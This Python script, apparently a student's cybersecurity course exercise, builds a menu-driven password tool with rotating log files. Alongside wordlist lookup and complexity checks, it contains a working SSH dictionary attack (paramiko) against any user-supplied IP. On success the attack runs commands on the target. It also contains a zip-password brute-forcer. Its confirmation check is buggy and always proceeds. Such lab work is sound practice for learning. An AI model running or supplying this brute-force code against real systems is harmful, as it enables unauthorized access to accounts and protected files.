# Script: 28 - Automated Brute Force Wordlist Attack Tool Part 6 of 6 - INCOMPLETE
# Author: Robert Gregor
# Date of latest revision: 23 MAY 23

# Objectives (PART IV) - Add logging capabilities to your Python tool using the logging library
    # Experiment with log types
    # Build in some error handling, then induce some errors
    # Send log data to a file in the local directory
    # Confirm your logging feature is working as expected

# My Sources (PART IV)
    # [Logging HOWTO](https://docs.python.org/3/howto/logging.html#logging-basic-tutorial)
    # [What Are stdin, stdout, and stderr on Linux?](https://www.howtogeek.com/435903/what-are-stdin-stdout-and-stderr-on-linux/)
    # [Logging Module in Python](https://dotnettutorials.net/lesson/logging-module-in-python/)

# Objectives (PART V)
    # Add logging capabilities by adding a log rotation feature based on size

# My Sources (PART V)
    # [Python: How to Create Rotating Logs](https://www.blog.pythonlibrary.org/2014/02/11/python-how-to-create-rotating-logs/)
    # [logging — Logging facility for Python](https://docs.python.org/3/library/logging.html)
    # [logging setLevel, how it works](https://stackoverflow.com/questions/6614078/logging-setlevel-how-it-works)
    # [logging.handlers — Logging handlers](https://docs.python.org/3/library/logging.handlers.html)
    # [Logging Cookbook](https://python.readthedocs.io/en/stable/howto/logging-cookbook.html)

#!/usr/bin/env python

# Import libraries
import time, getpass, os, re
import paramiko, hashlib
from zipfile import ZipFile

# Import Libraries for PART IV
import logging
import os
from datetime import datetime

# Import library
from logging.handlers import RotatingFileHandler
# Stores formatted date and time in log_file_time variable
log_file_time = datetime.now().strftime("log-%Y-%m-%d.txt")
# Create logger
logger = logging.getLogger('my_logger')
# Set log level
logger.setLevel(logging.INFO)
# Create RotatingFileHandler
handler = logging.handlers.RotatingFileHandler(log_file_time, maxBytes=200, backupCount=5)
# Create formatter
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S %Z')
# Set formatter for handler
handler.setFormatter(formatter)
# Add handler to logger
logger.addHandler(handler)

# Logs program execution time
logger.info('Program Executed')

def wordlist_iterate():   
    # Accepts user input path to wordlist
    word_list = str(input("\nPlease enter the path to your word list (ex. /home/user/wordlist.txt)):\n"))
    # Conditional determines if word list file exists
    if os.path.isfile(word_list):
        # With statement opens word_list file in read mode as file
        with open(word_list, 'r') as file:
            # For loop iterates through each line in word_list
            for line in file:
                # Removes leading and trailing white space, breaks line into list of words
                passwords = line.strip().split()
                # For loop iterates through each password in passwords list
                for password in passwords:
                    # Assigns current password read to variable
                    variable = password
                    # One second delay
                    time.sleep(1)
                    print()
                    # Prints current password to screen
                    print(variable)
    else:
        # Call logging.info function with invalid user word list as 2nd arguement
        logger.info('Word list not found: %s', word_list)
        # Print error to terminal
        print("\nERROR - Word list not found, please try again!")
               
def recog_passwd():
    # Accepts user input for word list and password to query
    word_list = str(input("\nPlease enter the path to your word list (ex. /home/user/wordlist.txt)):\n"))
    user_passwd = str(input("\nPlease enter the password you would like to query:\n"))
    # Conditional determines if word list file exists
    if os.path.isfile(word_list):
        # With statement opens word_list file in read mode as file
        with open(word_list, 'r') as file:
            # For loop iterates through each line in word_list
            for line in file:
                # Removes leading and trailing white space, breaks line into list of words 
                passwords = line.strip().split()
                # Conditional determines if user_password is in user provided word list
                if user_passwd in passwords:
                    print(f"\nPassword '{user_passwd}' was found in the {word_list} word list")
                    break
            else:
                print(f"\nPassword '{user_passwd}' was not found in the {word_list} word list")

def complex_passwd():
    user_passwd = str(input("\nPlease enter the password you would like to verify meets complexity requirements:\n"))
    # Declare variables for password requirements
    min_length = 8
    min_capital_letters = 2
    min_numbers = 2
    min_special_characters = 2

    # Conditional uses len function to determine if password length meets requirements
    if len(user_passwd) >= min_length:
        print("\nPassword length: Satisfied")
    else:
        print(f"Password length: Not satisfied (minimum {min_length} characters)")

    # re.findall function counts how many capital letters are found in user_passwd
    capital_letters = re.findall(r'[A-Z]', user_passwd)
    # Conditional used to determine if number of capital letters used meets requirements
    if len(capital_letters) >= min_capital_letters:
        print(f"Minimum of {min_capital_letters} capital letters: Satisfied")
    else:
        print(f"Minimum of {min_capital_letters} capital letters: Not satisfied")

    # re.findall function counts how many numbers are found in user_passwd
    numbers = re.findall(r'\d', user_passwd)
    # Conditional used to determine if number of numbers used meets requirements
    if len(numbers) >= min_numbers:
        print(f"Minimum of {min_numbers} numbers: Satisfied")
    else:
        print(f"Minimum of {min_numbers} numbers: Not satisfied")

    # re.findall function counts how many specified special characters are found in user_passwd
    special_characters = re.findall(r'[!@#$%^&*(),.?":{}|<>]', user_passwd)
    # Conditional used to determine if number of special characters used meets requirements
    if len(special_characters) >= min_special_characters:
        print(f"Minimum of {min_special_characters} special characters: Satisfied")
    else:
        print(f"Minimum of {min_special_characters} special characters: Not satisfied")

    # Conditional determines if all requirements are met using boolean logic
    if (len(user_passwd) >= min_length and
        len(capital_letters) >= min_capital_letters and
        len(numbers) >= min_numbers and
        len(special_characters) >= min_special_characters):
        print("\nSUCCESS! YOU HAVE MET PASSWORD COMPLEXITY REQUIREMENTS!")

def ssh_auth():
    # Accepts user input for word list and password to query
    ssh_ip = str(input("\nPlease enter the IP address of the system you would like to SSH into:\n"))
    ssh_username = str(input("\nPlease enter the user name for the SSH login:\n"))
    word_list = str(input("\nPlease enter the path to the word list you would like to use (ex. /home/user/wordlist.txt)):\n"))
    
    # Verifies user wants to execute dictionary attack with given input parameters
    print(f"\nIP Address: {ssh_ip}")
    print(f"Username: {ssh_username}")
    print(f"Wordlist file path: {word_list}")
    print("----------------------------------------------------")
    exe_bf_att = input("\nAbove are the parameters you selected, are you sure you would like to proceed? (y/n)? ")
    
    # Conditional determines execution
    if exe_bf_att == "Y" or "y":
        # Conditional determines if word list file exists 
        if os.path.isfile(word_list):
            # With statement opens file in read mode 
            with open(word_list, "r") as file:
                # For loop iterates through each password in word list
                for line in file:
                    # Removes leading and trailing white space, breaks line into list of words
                    passwd = line.strip()
                    # Sets up SSH client with paramiko python library
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    try:
                        # Tries to make SSH connection with given input parameters and current password
                        time.sleep(1)
                        ssh.connect(ssh_ip, username=ssh_username, password=passwd)
                        print(f"Password Found!: {passwd}\n")
                        # If SSH connection is successful executes basic linux commands to verify
                        stdin, stdout, stderr = ssh.exec_command("whoami")
                        time.sleep(3)
                        output = stdout.read()
                        print("--------------")
                        print("whoami command")
                        print("--------------")
                        print(output)
                        print()
                        stdin, stdout, stderr = ssh.exec_command("ls -l")
                        time.sleep(3)
                        output = stdout.read()
                        print("-------------")
                        print("ls -l command")
                        print("-------------")
                        print(output)
                        print()
                        stdin, stdout, stderr = ssh.exec_command("uptime")
                        time.sleep(3)
                        output = stdout.read()
                        print("--------------")
                        print("uptime command")
                        print("--------------")
                        print(output)
                        # Closes SSH connection
                        ssh.close()
                        return
                    # If SSH connection unsuccessful, notify user, and attempt next password in list
                    except paramiko.AuthenticationException as e:
                        print(f"\nIncorrect Password: {passwd}")

            # Notify user password not found in word list
            print("Apologies, couldn't crack password.")

def bf_zipfile():
    # Requests user input for zip_file and word_list locations
    zip_file = input("\nPlease enter path to zip file you would like to Brute Force: ")
    word_list = input("Please enter path to wordlist file: \n")
    # Opens user selected word_list in read mode
    with open(word_list, 'r') as file:
        # Read contents of file into string then splits into list
        passwd_list = file.read().splitlines()
    # For loop iterates through each password in passwd_list
    for password in passwd_list:
        try:
            # Opens zip_file
            with ZipFile(zip_file) as zf:
                # Attempts to extract files using current password in list
                zf.extractall(pwd=bytes(password,'utf-8'))
            # Prints if password found
            print(f"Password found: {password}")
            # Ends function if correct password is found
            return
        except:
            print(f"Apologies, {password} password not found\n")
            time.sleep(1)

while True:
      
    print("\n------------------------")
    print("Please choose an option:")
    print("------------------------")
    print("1) List all passwords in word list\n2) Password in word list?\n3) Password complexity evaluation\n4) Brute force SSH access\n5) Brute force password locked zip file\nexit) Exits program")
    user_option = str(input("------------------------\n"))

    if user_option == "1":
        wordlist_iterate()
    elif user_option == "2":
        recog_passwd()
    elif user_option == "3":
        complex_passwd()
    elif user_option == "4":
        ssh_auth()
    elif user_option == "5":
        bf_zipfile()
    elif user_option == "exit":
        logger.info('Program Exited')
        print("\nExited successfully!\n")
        exit()
    
    else:
        # Call logging.info function with invalid user input as 2nd arguement
        logger.info('Invalid Input Received: %s', user_option)
        # Print error to terminal
        print("\nERROR - Invalid input, please try again!")
        continue


